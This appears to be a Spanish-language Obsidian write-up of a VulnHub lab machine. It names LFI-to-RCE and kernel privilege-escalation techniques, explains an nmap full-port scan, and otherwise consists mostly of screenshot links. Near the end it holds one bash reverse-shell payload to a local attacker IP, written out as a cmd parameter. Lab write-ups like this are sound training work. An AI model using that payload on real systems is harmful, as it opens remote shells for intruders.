[[Vulnhub]]
Lunes 25 de agosto del 2023 Mexico.
CDMX-Polanco
Valente Spiegel
![[Pasted image 20230808142013.png]]

---
# Habilidades

Web Enumeration  <br>Local File Inclusion (LFI) through info.php file  <br>LFI to RCE (Way 1) [Abusing PHP filters chain]  <br>LFI to RCE (Way 2) [Log Poisoning via SSH logs]  <br>Linux Kernel < 4.13.9 Ubuntu 16.04 Exploitation [Privilege Escalation]|

---

# Creación de directorios para espacio de trabajo.

Es importante crear directorios o espacios de trabajo específicos al resolver una máquina.
Al crear un directorio o espacio de trabajo dedicado para una máquina de VulnHub, puedes mantener ordenada toda la información relacionada con esa máquina en un solo lugar. Esto incluye archivos de configuración, resultados de escaneos, notas y cualquier otro dato relevante. Una estructura organizada facilita el seguimiento del progreso, el acceso rápido a la información y la revisión posterior de los pasos realizados.

```java
mkdir tomato && cd tomato && mkdir {Scan,Content,Exploits,Evidencia}
```
---

==Escaneo de puertos:

Se realiza un escaneo más detallado de los puertos abiertos identificados durante la fase de descubrimiento. Esto implica el uso de herramientas como Nmap para obtener información sobre los servicios y versiones específicas que se ejecutan en cada puerto.

```java
Sudo nmap -p- --open -sS --min-rate 5000 -vvv - n - Pn 192.168.153.128

El comando "sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.153.128" es una forma de utilizar la herramienta de escaneo de red Nmap con una serie de opciones y argumentos específicos. Aquí está el significado de cada opción utilizada en el comando:

- `sudo`: Ejecuta el comando con privilegios de superusuario para obtener un escaneo más completo y preciso.

- `nmap`: El comando en sí para ejecutar Nmap.

- `-p-`: Escanea todos los puertos, desde el puerto 1 hasta el puerto 65535. Esto permite una exploración exhaustiva de todos los puertos abiertos en el objetivo.

- `--open`: Muestra solo los puertos que están abiertos y disponibles para conexiones.

- `-sS`: Realiza un escaneo TCP SYN. Envia un paquete SYN al puerto de destino y espera una respuesta SYN-ACK. Este tipo de escaneo se utiliza para determinar qué puertos están abiertos.

- `--min-rate 5000`: Establece la tasa mínima de paquetes enviados por segundo a 5000. Esto controla la velocidad del escaneo, asegurando que se envíen suficientes paquetes para obtener resultados precisos.

- `-vvv`: Establece el nivel de verbosidad a "muy, muy, muy" alto, lo que proporciona una salida detallada y exhaustiva durante el escaneo.

- `-n`: Desactiva la resolución de nombres de hosts para acelerar el escaneo y evitar consultas DNS.

- `-Pn`: Suprime la detección de hosts y trata todas las direcciones IP especificadas como hosts activos. Esto puede ser útil si se desea escanear un objetivo incluso si no hay respuesta a los pings.

- `192.168.153.128`: Es la dirección IP del objetivo que se va a escanear.

```


![[Pasted image 20230808141944.png]]
![[Pasted image 20230808142345.png]]
![[Pasted image 20230808142438.png]]
![[Pasted image 20230808142748.png]]
![[Pasted image 20230824132332.png]]
![[Pasted image 20230824132501.png]]

![[Pasted image 20230824132825.png]]

![[Pasted image 20230824170758.png]]

![[Pasted image 20230824171724.png]]
![[Pasted image 20230824173155.png]]
![[Pasted image 20230824173216.png]]

![[Pasted image 20230825110512.png]]

![[Pasted image 20230825110715.png]]

![[Pasted image 20230825113250.png]]

![[Pasted image 20230825113444.png]]

![[Pasted image 20230825120425.png]]

![[Pasted image 20230825120455.png]]
![[Pasted image 20230825121306.png]]


![[Pasted image 20230825121416.png]]

![[Pasted image 20230825121545.png]]
![[Pasted image 20230825121717.png]]
![[Pasted image 20230825122320.png]]

![[Pasted image 20230825122545.png]]

![[Pasted image 20230825122652.png]]
&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.153.152/4433 0>%261"

![[Pasted image 20230825124547.png]]

![[Pasted image 20230825124609.png]]
![[Pasted image 20230825130035.png]]

![[Pasted image 20230825130120.png]]

![[Pasted image 20230825130234.png]]


![[Pasted image 20230825130513.png]]

![[Pasted image 20230825131010.png]]

![[Pasted image 20230825133311.png]]

![[Pasted image 20230825133500.png]]
![[Pasted image 20230825134552.png]]

